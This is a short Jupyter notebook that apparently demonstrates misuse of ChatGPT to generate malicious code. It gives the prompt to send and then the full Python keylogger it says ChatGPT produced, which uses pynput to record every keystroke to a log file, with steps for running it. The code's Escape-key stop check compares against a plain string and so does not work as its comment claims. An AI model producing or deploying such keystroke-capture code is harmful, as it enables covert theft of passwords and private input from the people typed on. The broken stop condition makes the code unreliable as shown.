# %% [markdown]
# ### Introduction
#
# ChatGPT, one of the popular Generative AI platforms, is a powerful language model developed by OpenAI. While it has a wide range of legitimate applications, it is crucial to recognize the potential for misuse, such as someone exploiting the model to generate malicious code.
#
# ### Objective
# Leverage the capability of Generative AI for malicious code generation.
#
# ### Requirements
# - ChatGPT account.
#     Send a prompt ```Generate a python code to store any keystroke pressed in a file```
# - pip install pynput

# %%
# Sample Code generated by ChatGPT
from pynput.keyboard import Listener
import logging

# Set up logging configuration
log_file = "keystrokes.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        # Log the key that was pressed (and convert to string if possible)
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys like 'space', 'enter', etc.
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == 'esc':  # Stop the listener when 'esc' key is released
        return False

# Set up listener for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# %% [markdown]
# * The code above will need to be copied to another .py file and ran the script.
#
# The `keystrokes.log` records the keys you entered in your computer.

# %% [markdown]
# ![image.png](attachment:image.png)
